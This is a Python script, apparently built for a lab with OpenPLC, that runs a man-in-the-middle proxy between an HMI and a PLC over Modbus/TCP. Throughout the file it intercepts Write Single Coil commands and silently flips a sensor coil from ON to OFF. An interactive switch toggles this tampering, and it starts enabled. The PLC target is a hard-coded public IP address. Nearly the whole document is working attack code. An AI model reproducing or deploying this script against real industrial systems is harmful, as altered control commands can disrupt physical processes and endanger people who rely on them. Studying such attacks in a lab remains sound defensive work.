# Import necessary libraries.
# socket: For low-level network communication (creating sockets, connecting, sending/receiving data).
# select: For efficiently monitoring multiple sockets at once to see which are ready for reading.
# struct: For packing and unpacking binary data, allowing us to parse the Modbus packet bytes.
# threading: For running our attack toggle listener in the background without blocking the main proxy.
import socket
import select
import struct
import threading

# Import Scapy's core Packet class and field types. We use this to define the Modbus protocol's
# structure, making our code more readable, even though we manually parse bytes for performance.
from scapy.all import Packet, ShortField, ByteField, ShortEnumField

# ==============================================================================
# SECTION 1: MODBUS PROTOCOL DEFINITION USING SCAPY
#
# Here, we create a "blueprint" of the Modbus packets we're interested in.
# This serves as excellent documentation and could be used for crafting packets,
# though in this script we parse bytes manually in the interest of speed.
# This works by inheriting from Scapy's base `Packet` class.
# ==============================================================================

class ModbusTCP(Packet):
    # This class defines the header that wraps all Modbus TCP communications.
    name = "Modbus/TCP"
    fields_desc = [
        # Transaction ID (2 bytes): A unique number to match requests with responses.
        ShortField("trans_id", 0),
        # Protocol ID (2 bytes): Always 0 for Modbus TCP.
        ShortField("proto_id", 0),
        # Length (2 bytes): The number of bytes that follow this header.
        # Scapy can calculate this automatically if set to None.
        ShortField("len", None),
        # Unit ID (1 byte): The address of the specific slave device on the bus.
        ByteField("unit_id", 1),
    ]

class ModbusPDU05WriteSingleCoilRequest(Packet):
    # This class defines the specific Modbus command we are targeting: Function Code 5.
    # PDU stands for "Protocol Data Unit" - it's the core command part of the packet.
    name = "Write Single Coil"
    fields_desc = [
        # Function Code (1 byte): The command to be executed. 5 means "Write a single coil".
        ByteField("func_code", 5),
        # Output Address (2 bytes): The address of the coil to write to (e.g., address 0 for %IX0.0).
        ShortField("output_address", 0),
        # Output Value (2 bytes): The value to write. 0xFF00 means ON, and 0x0000 means OFF.
        ShortEnumField("output_value", 0, {0: "Off", 0xff00: "On"}),
    ]

# ==============================================================================
# SECTION 2: PROXY CONFIGURATION
#
# These are global constants that define the network endpoints for our proxy.
# ==============================================================================

# The IP address the proxy will listen on for incoming connections from the HMI.
# '0.0.0.0' means it will listen on all available network interfaces on this machine.
HMI_LISTEN_IP = '0.0.0.0'
# The TCP port the proxy will listen on. We use 502, the standard Modbus port,
# to make the proxy transparent to the HMI.
HMI_LISTEN_PORT = 502

# The IP address of the actual PLC server (our DigitalOcean Droplet A).
# This is where the proxy will forward all traffic.
PLC_IP = '129.212.183.179'
# The port of the actual PLC server.
PLC_PORT = 502

# ==============================================================================
# SECTION 3: INTERACTIVE ATTACK TOGGLE
#
# This section provides a way to enable or disable the packet modification
# logic in real-time while the proxy is running.
# ==============================================================================

# A global boolean flag that controls whether the attack logic is active.
# We initialize it to True, so the attack is on by default.
ATTACK_ON = True

def attack_toggle_listener():
    # This function runs in a separate thread and waits for user input.
    global ATTACK_ON
    while True:
        # The `input()` function will block this background thread, waiting for the user
        # to type something and press Enter, without pausing the main proxy loop.
        user_input = input("[ON/OFF] Press 'O' (then Enter) to toggle attack: ").strip().lower()
        if user_input == "o":
            # Invert the boolean flag.
            ATTACK_ON = not ATTACK_ON
            print(f"\n[INFO] Attack interception is now {'ENABLED' if ATTACK_ON else 'DISABLED'}\n")

# Create and start the background thread.
# `daemon=True` ensures that this thread will automatically close when the main program exits.
threading.Thread(target=attack_toggle_listener, daemon=True).start()

# ==============================================================================
# SECTION 4: PACKET MODIFICATION LOGIC
#
# This is the core of the Man-in-the-Middle attack. This function inspects
# data as it passes through the proxy and modifies it if it matches our criteria.
# ==============================================================================

def intercept_and_modify(data):
    # This function takes a chunk of raw bytes (`data`) received from the HMI.

    # First, check the global toggle. If the attack is disabled,
    # immediately return the data without any changes.
    if not ATTACK_ON:
        return data

    # A valid Modbus "Write Single Coil" request is 12 bytes long.
    # If the data is shorter, we don't need to inspect it.
    if len(data) < 12:
        return data

    try:
        # For performance, we manually unpack the bytes using the `struct` library.
        # ">" specifies big-endian byte order, which is standard for network protocols.
        # "H" is a 2-byte unsigned short, "B" is a 1-byte integer.
        
        # We don't need these values for our logic, but this shows how you'd parse them.
        # trans_id, proto_id, length = struct.unpack(">HHH", data[0:6])
        # unit_id = data[6]

        # Get the Function Code from the 8th byte (index 7).
        func_code = data[7]
        
        # We only care about Function Code 5.
        if func_code == 5:
            # If it's FC5, unpack the address (bytes 8-9) and value (bytes 10-11).
            output_address = struct.unpack(">H", data[8:10])[0]
            output_value = struct.unpack(">H", data[10:12])[0]
            
            print(f"[DEBUG] Intercepted Write Single Coil: address={output_address}, value=0x{output_value:04x}")
            
            # This is our specific attack rule:
            # IF the target is address 0 (`proxi_sensor`)
            # AND the value is 0xFF00 (ON)
            if output_address == 0 and output_value == 0xFF00:
                print("[ATTACK] Intercepted 'proxi_sensor = TRUE' command! Changing to OFF.")
                # We rebuild the `data` byte string, replacing the value portion
                # with two null bytes (0x0000), which means OFF.
                data = data[:10] + b"\x00\x00" + data[12:]
    except Exception as e:
        # If the data is not a valid Modbus packet, `struct.unpack` might fail.
        # We catch the error and print it, but still return the original data.
        print(f"[DEBUG] Exception parsing/modifying: {e}")
    
    # Return the data, which will be the modified version if our rules matched.
    return data

# ==============================================================================
# SECTION 5: MAIN PROXY LOOP
#
# This is the engine of the proxy. It listens for connections, manages the
# data flow between the HMI and the PLC, and calls our modification logic.
# ==============================================================================

def main():
    # Create a TCP socket that will listen for the HMI.
    server_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # This option allows the script to reuse the port immediately after it closes.
    server_sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    # Bind the socket to our listening IP and port.
    server_sock.bind((HMI_LISTEN_IP, HMI_LISTEN_PORT))
    # Listen for up to 5 incoming connections.
    server_sock.listen(5)
    print(f"Listening for HMI connections on {HMI_LISTEN_IP}:{HMI_LISTEN_PORT}")

    # This outer loop allows the proxy to accept new HMI connections if one disconnects.
    while True:
        # The `accept()` call blocks and waits until an HMI connects to it.
        client_sock, addr = server_sock.accept()
        print(f"\n[+] Accepted connection from HMI at {addr}")

        # Once an HMI connects, we create a *new* socket to connect to the real PLC.
        plc_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        plc_sock.connect((PLC_IP, PLC_PORT))
        print(f"[+] Connected to OpenPLC at {PLC_IP}:{PLC_PORT}")

        # This inner loop handles the data relay for the active connection.
        # We put both sockets into a list to monitor them.
        sockets = [client_sock, plc_sock]
        try:
            while True:
                # `select.select()` is a powerful call that blocks until one of the sockets
                # in the list has data ready to be read. This is very efficient.
                readable, _, _ = select.select(sockets, [], [])

                # Loop through the sockets that are ready to be read.
                for s in readable:
                    # Receive up to 4096 bytes of data.
                    data = s.recv(4096)
                    # If `recv` returns no data, the other end has closed the connection.
                    if not data:
                        raise Exception("Connection closed.")

                    # If the data is from the HMI (client_sock)...
                    if s is client_sock:
                        # ...run it through our attack logic...
                        out_data = intercept_and_modify(data)
                        # ...and send the result to the PLC.
                        plc_sock.sendall(out_data)
                    # Otherwise, the data must be from the PLC...
                    else:
                        # ...so we relay it directly back to the HMI without modification.
                        client_sock.sendall(data)
        except Exception as e:
            # If any error occurs (like a closed connection), we clean up.
            print(f"[!] Connection error or closed: {e}")
            client_sock.close()
            plc_sock.close()
            print("[*] Waiting for next HMI connection...")

# This is the standard entry point for a Python script.
if __name__ == '__main__':
    main()
